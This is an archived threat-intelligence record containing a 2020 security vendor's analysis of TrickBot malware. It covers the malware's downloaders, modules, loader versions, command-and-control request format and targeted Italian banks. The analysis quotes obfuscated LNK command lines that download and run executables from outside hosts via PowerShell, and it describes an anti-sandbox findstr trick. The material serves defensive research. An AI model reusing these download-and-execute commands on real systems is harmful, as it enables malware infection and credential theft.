{
    "id": "c98fbedc-09a5-49bc-a64d-6db52f989549",
    "created_at": "2023-01-12T15:02:32.014623Z",
    "updated_at": "2025-03-27T02:05:46.020433Z",
    "deleted_at": null,
    "sha1_hash": "8606fe2390daf3ee9b8cee8960709d979b6caa9e",
    "title": "2020-04-09 - TrickBot Emerges with a Few New Tricks",
    "authors": "",
    "file_creation_date": "2022-05-28T19:34:04Z",
    "file_modification_date": "2022-05-28T19:34:04Z",
    "file_size": 5683523,
    "plain_text": "# TrickBot Emerges with a Few New Tricks\n\n**[zscaler.com/blogs/research/trickbot-emerges-few-new-tricks](https://www.zscaler.com/blogs/research/trickbot-emerges-few-new-tricks)**\n\nFirst observed in 2016, TrickBot is a successor of the banking trojan Dyre and has become\none of the most prevalent and dangerous malware strains in today's threat landscape,\n[which is constantly monitored by the Zscaler ThreatLabZ team. TrickBot is continually](https://www.zscaler.com/threatlabz/cloud-activity-dashboard)\nevolving as its developers add new features and tricks. It is modular, with a main bot binary\nthat loads other plugins capable of specific tasks, with new modules being introduced and\nold ones being improved at regular intervals.\n\n## Solidarity with other malware\n\nTrickBot is often seen working with other types of malware, sometimes using them as an\ninitial infection vector to find its way into the target host or downloading other malware\nfamilies to get the most out of an infection. For example, Emotet, the rampant banking\ntrojan, has become a major partner for TrickBot deployments. TrickBot is also known to\nhave deployed cryptominer payloads (Monero miner XMRIG) on infected hosts. And\nrecently, Ryuk has become the TrickBot developers’ favorite ransomware for squeezing\nmore cash out of infections from high-value targets.\n\nDevelopers are now identifying high-value targets using data collected by TrickBot. Once a\ntarget is identified, they use other tools like CobaltStrike, PowerShell Empire, PSExec, and\n[AdFind to navigate and plant Ryuk ransomware (discussed in an earlier post). Legal](https://www.zscaler.com/blogs/research/examining-ryuk-ransomware)\nservices and e-discovery giant Epiq Global had to take its systems offline due to a Ryuk\ninfection in the beginning of March 2020.\n\n[They have also developed new malware, called AnchorBot, which is based on TrickBot](https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware)\ncode and utilizes DNS as the command-and-control (C&C) medium. Unlike TrickBot,\nAnchorBot has not been seen in the wild using malspam or other malware for deployment.\nIt is probably a specialized version reserved for certain targets or may be available to rent\n\n\n-----\n\nout to special customers, potentially nation-state actors. (Notably, Ryuk was attributed to\nNorth Korean actors based on code similarities with Hermes ransomware, but many\nresearchers later argued that these similarities were not conclusive.)\n\nSince almost every TrickBot infection starts with malspam containing an attached\n[downloader or from a partner botnet like Emotet, we will take a look at those downloading](https://www.zscaler.com/blogs/research/emotet-back-action-after-short-break)\nTrickBot loaders over the last year. We have primarily seen three types of non-executable\ndownloaders:\n\nLNK\nJS\nDOC\n\n## LNK downloader\n\nTrickBot is often spread using spam emails with attached ZIP files containing LNK (.lnk)\nfiles. We have seen LNK files with the following icons.\n\nImage 1: LNK file icons observed in the wild\n\n**Names of files observed:**\n\n_Label.doc.lnk_\n\n_PrintOnline.pdf.lnk_\n\n_Print.PDF.lnk_\n\n_ConfirmationOnline.doc.lnk_\n\n_Readme_Invoice_Doc.doc.lnk_\n\n_InvoiceAug5.doc.lnk_\n\n_Invoice_Print.lnk_\n\n_DOC080219Admission.lnk_\n\nOne interesting thing is that eight out of nine LNK files had the MachineID win-jbf0q9el659.\n\nSome samples contained a PowerShell script to download a payload from the URL directly\nin the Link Target field. For example:\n\n\n-----\n\n_%comspec% /r TIMEOUT /T 5&echo F|xcopy /Y /V /H %PSModulePath:~43,-8%\\p e?_\n_s*l.e?? %tmp%\\Ger.exe &%tmp%\\Ger \"IwR ('https://parkc.org/filetext.php') -outfile_\n_$env:temp'\\ssd.exe'\"&echo pause&TimEout /t_\n_3&%temp%/ssd&selrkekrjg&dsghd&sfr345jwrf&&e56tdsf\"_\n\n_/C set o=HttPs:/&powershEll \"$sd=new-object_\n_system.nEt.weBcliEnt;$sd.doWnloAdfIle($env:o+'/www.braintrainersuk.com/ONOLTDA-_\n_GD.exe',$env:tmp+'\\D.exe');\"&\"%programfiles%\\wiNDows nt\\accESsorIes\\wORdpaD\"_\n_c:\\pagefIle.syS&%tmp%/d&J34HH&E34JSH_d+&df_\n\nThese LNK files contain batch commands to extract and run downloader VBS code. For\nexample:\n\n_%comspec% /c copy SnJfA & (findstr \"Mydlu.*\" Label.doc.lnk > \"%tmp%\\SNkBU.vbs\" &_\n_\"%tmp%\\SNkBU.vbs\") & qcpST_\n\nIt used the findstr command to find the start of a VBS script embedded in the LNK file and\nexecuted that script after saving in the %temp% directory. Here, the name of the LNK file is\nprovided to the findstr command. That also works as an anti-sandbox trick for some of the\nsandboxes that do not run files with their original names.\n\nIn this script we mainly observed two types of obfuscation; one is where the obfuscated\nstring is provided and it executes, replacing a part of it with “)+chr(“\n\nImage 2: Code using CHR obfuscation\n\nIn another type of obfuscation, two arrays of values are provided, and the decrypted script\nis built character by character with arithmetic operations on array elements.\n\nImage 3: Code using arrays for obfuscation\n\n\n-----\n\nAfter decryption, the script looks the same for the LNK file as well as the script files from the\nspam emails:\n\nImage 4: Decrypted downloader payload\n\nThese variations may be an attempt to bypass AV emulators. The malware tries to create a\nshortcut and save by passing a parameter to the save method, which will fail on the real\nmachine. After that, it checks if the file exists and only downloads if the file has not been\ncreated.\n\n## Script downloader\n\nThe obfuscation scripts and final downloader scripts are similar to scripts extracted from\nLNK files. In these files, we’ve seen some additional types of obfuscation along with the\nobfuscation seen in scripts from LNK files.\n\n\n-----\n\nImage 5: Obfuscated script\n\nImage 6: Another obfuscated script\n\nWhile in most cases, the final scripts responsible for downloading the TrickBot payload were\nidentical and not obfuscated, in one case the script was slightly obfuscated:\n\n\n-----\n\nImage 7: Decrypted downloader with slight obfuscation\n\n## Document downloader\n\nDownloaders based on Office documents were once the favorite choice of TrickBot\ndevelopers. But recently, we have seen a downtrend in macro-based document usage for\nTrickBot delivery.\n\nSome of the document templates we have observed during last year are below.\n\n\n-----\n\nImage 8: Set of templates used by downloader documents to lure the end users\n\n\n-----\n\nImage 9: Another set of templates used by downloader documents to lure the end users\n\n\n-----\n\nImage 10: U.S. Employment template used by document downloaders\n\nImage 11: JP Morgan template used by document downloaders\n\nThere were different variations of documents downloading TrickBot. Some of the variations\nwe observed included:\n\n\n-----\n\nDrop and execute JS/JSE files which further download the TrickBot payload. The\ndropped script file is similar to the files discussed in the script downloader section.\nMacro code downloads and executes payload.\nNo macro code in file, executable directly embedded in document as ActiveX, requires\nuser to double-click.\n\nImage 12: Executable directly embedded in document as ActiveX\n\nDeobfuscate and build batch commands to download file\n\nFirst create a copy of bitsadmin file\nDownload payload using copied bitsadmin file\n\nImage 13: Commands extracted used by downloader\n\nIn other cases, it drops a BAT file containing PowerShell code to download payload\n\n\n-----\n\nImage 14: PowerShell encrypted and decrypted command\n\nActions used to start execution of downloader:\n\nMacro Auto_Open()\nMacro Document_Open()\nMacro Document_Close()\nDouble-click by user to run ActiveX object\n\n## Loader\n\nOnce it’s downloaded, the main TrickBot component known as the TrickBot loader begins to\nrun. The loader acts as banking Trojan and is also responsible for downloading various\nmodules for specific tasks. TrickBot modules come in 32-bit and 64-bit and, depending on\nthe architecture of the infected system, the loader downloads and runs the corresponding\nmodules.\n\nThe following are the TrickBot modules seen in the wild:\n\nSysteminfo - For gathering basic information on the host\nimportDll - For stealing data from a browser\ninjectDll - For injecting into banking websites to steal credentials\nPwgrab - For grabbing passwords from various spots\ncookiesDll - For stealing/grabbing cookies\nmailsearcher - For traversal over all files in all drives in the system to steal\nsharedll - For transferring over to ADMIN shares and creating persistence via services\nnetworkDll - For gathering system information and network/domain topology\nNewBCtestDll - Backconnect SOCK5 module\npsfin - Point-of-Sale 'recon' module\n\n\n-----\n\nvncDll - Remote control/VNC module\nwormDll - For lateral movement\ntabDll - For spreading over SMB using EternalRomance and MS17-010\noutlookDll - For stealing data saved by Microsoft Outlook\ndomainDll - For LDAP harvesting of domain controller configuration\nmwormDll - For lateral movement/enumeration module via LDAP and SMB\nexploitation\nmshareDll - For lateral movement/enumeration via LDAP and SMB exploitation;\nmshare and mworm modules work in cooperation\nrdpScanDll - New module that uses brute-force remote desktop protocol (RDP) for a\nspecific list of victims\n\nIt downloads and injects each module into a new instance of svchost.exe. For each running\nTrickBot component there is a corresponding instance of svchost.exe.\n\nThe latest version of loaders that we have seen in wild are 1087 and 1088, and the most\nrecent config version is 1000503.\n\n\n-----\n\nImage 15: TrickBot loader configuration\n\nWe looked at loader version numbers and their compilation dates, then plotted version 1058\nto version 1088 with their corresponding compilation dates. It seems that two different\nversions are maintained at a time:\n\n\n-----\n\nImage 16: TrickBot loader version and compilation date timeline\n\nIt may seem that each version represents two botnets that are run independently, but\naccording to our data, the C&C infrastructure is shared by all versions. More than 1,400\nC&C IPs extracted from the TrickBot configuration were used to draw a relationship map\nwith loader versions.\n\nUnlike Emotet, which uses a separate first layer C&C infrastructure for different epochs, we\nobserved no such organization in TrickBot. It shares its first layer infrastructure between all\nlevels, global site tags (gtags), and versions.\n\n\n-----\n\nImage 17: TrickBot loader version relationships with C&C IPs\n\nSimilarly, almost all gtags in configs also share the same infrastructure or proxy\ninfrastructure.\n\n\n-----\n\nImage 18: TrickBot gtag relation with C&C IPs\n\nWith the exception of gtag mill (20mill), all others share C&C infrastructure.\n\nImage 19: Configuration file extracted from MD5: 598bc23fc38b4712289ff5488bce2f1c\ncontaining \"20mill\" gtag\n\nC&C infrastructure is shared between different levels of TrickBot infection, such as between\nloaders and modules (handling bots, modules, and webinjects).\n\n\n-----\n\nImage 20: Different type of configuration relationships with IPs\n\n## Communication\n\nTrickBot communicates with C&C servers using GET requests and always uses numeric IP\naddresses as C&C addresses; its port numbers are usually 443, 449, or 499. The\n[communication always happens over SSL/TLS, but the port can be any of the ports used by](https://www.zscaler.com/blogs/corporate/inspect-or-not-inspect-ssl-why-even-question)\nTrickBot. The TrickBot loader supports various commands that it uses to communicate with\nthe C&C servers.\n\nIts C&C request pattern is:\n\n_{server-ip:port}/{gtag}/{client_id}/{Command}_\n\nSome of its interesting commands include:\n\n/0/ - initial contact format e.g /0/{os name}/{version}/{public ip}/{64 hex char}/{base64}\n/1/ - keep alive, wait for command\n/5/{name} - download module or injects e.g /5/injectDll64/, /5/dinj/\n/10/ Log module/command execution has started e.g. /10/62/972991/1/\n/14/ - profiling information or important feedback e.g /14/user/{username}/0/\n/23/{config_version} - Update base config\n\n\n-----\n\n/25/ - update bot e.g /25/M2vzSeNWHXZ2SZI8HNKwD/\n/60/ - post traffic captured by injectDll\n/63/ - issue command to component (x) e.g /63/injectDll/sTart/U3VjY2Vzcw==//\n(‘Success’) /1/\n/64/ - issue command to ETERNALBLUE component (wormdll) e.g\n/64/wormDll/InfectMachine/infect/\n/send/ - used by mailsearcher component to POST exfil email addresses\n\nIts webinject config looks like this:\n\nImage 21: Trickbot webinject configuration\n\nRecently, around the second week-end of March, TrickBot added a few new banks from\nItaly to its target list, which includes:\n\ncedacri.it banking4you.it www.credem.it nowbanking.credit-agricole.it\n\ninbank.it friuladria.it finecobank.com youweb.bancobpm.it\n\n\n-----\n\ncsebo.it carispezia.it relaxbanking.it www.intesasanpaolo.com\n\ncreval.it cariparma.it bpergroup.net ibbweb.tecmarket.it\n\nmps.it unicredit.it icbp.seceti.it dbonline.italy.db.com\n\nposte.it ibk.nexi.it banking.bnl.it fideuramonline.it\n\ngruppocarige.it clienti.chebanca.it scrigno.popso.it qweb.quercia.com\n\nib.cbibanking.it ubibanca.com bancagenerali.it paco.cabel.it\n\n## Conclusion\n\nThreat actors like the developers of TrickBot are becoming more and more sophisticated.\n[TrickBot recently introduced a new module called rdpScanDll. And, most recently, TrickBot](https://labs.bitdefender.com/2020/03/new-trickbot-module-bruteforces-rdp-connections-targets-select-telecommunication-services-in-us-and-hong-kong/)\nwas observed using Android malware to bypass two-factor authentication in Germany. We\nhave not seen the use of this app for other targets, but we don’t expect it to be long until\nattackers begin to use it worldwide. The Zscaler ThreatLabZ team proactively tracks and\nensures coverage to block downloaders, payloads, webinjects, and C&C activity from\nTrickBot and related malware. Because TrickBot’s C&C communications occur over SSL,\nwe strongly recommend the use of SSL inspection to detect and block TrickBot and similar\nthreats.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-04-09 - TrickBot Emerges with a Few New Tricks.pdf"
    ],
    "report_names": [
        "2020-04-09 - TrickBot Emerges with a Few New Tricks.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535752,
    "ts_updated_at": 1743041146,
    "ts_creation_date": 1653766444,
    "ts_modification_date": 1653766444,
    "files": {
        "pdf": "https://archive.orkl.eu/8606fe2390daf3ee9b8cee8960709d979b6caa9e.pdf",
        "text": "https://archive.orkl.eu/8606fe2390daf3ee9b8cee8960709d979b6caa9e.txt",
        "img": "https://archive.orkl.eu/8606fe2390daf3ee9b8cee8960709d979b6caa9e.jpg"
    }
}